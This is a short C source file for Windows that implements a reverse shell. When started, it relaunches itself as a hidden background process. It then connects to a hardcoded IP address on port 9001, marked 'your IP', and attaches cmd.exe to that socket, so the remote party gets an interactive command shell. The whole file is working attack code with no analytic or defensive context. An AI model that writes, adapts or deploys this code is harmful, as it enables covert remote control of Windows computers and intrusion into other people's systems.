#include <winsock2.h>
#include <windows.h>

#pragma comment(lib,"ws2_32")

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Step 1: Check if this is the child (background) process
    if (strstr(lpCmdLine, "--child") == NULL) {
        // Not the child → fork to background
        char path[MAX_PATH];
        GetModuleFileNameA(NULL, path, MAX_PATH); // get own path

        STARTUPINFOA si = { 0 };
        PROCESS_INFORMATION pi = { 0 };
        si.cb = sizeof(si);

        // Create background child
        CreateProcessA(
            path,
            "\"reverse_shell.exe\" --child", // adjust name if needed
            NULL,
            NULL,
            FALSE,
            CREATE_NO_WINDOW,
            NULL,
            NULL,
            &si,
            &pi
        );

        // Exit parent
        return 0;
    }

    // Step 2: We're in the child → do the reverse shell
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in server;
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;

    char *ip = "10.23.24.7";  // your IP
    int port = 9001;             // your port

    WSAStartup(MAKEWORD(2, 2), &wsaData);
    sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

    server.sin_family = AF_INET;
    server.sin_port = htons(port);
    server.sin_addr.s_addr = inet_addr(ip);

    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) != 0) {
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;

    CreateProcessA(
        NULL,
        "cmd.exe",
        NULL,
        NULL,
        TRUE,
        CREATE_NO_WINDOW,
        NULL,
        NULL,
        &si,
        &pi
    );

    // Clean up and exit — cmd.exe is detached
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    closesocket(sock);
    WSACleanup();

    return 0;
}
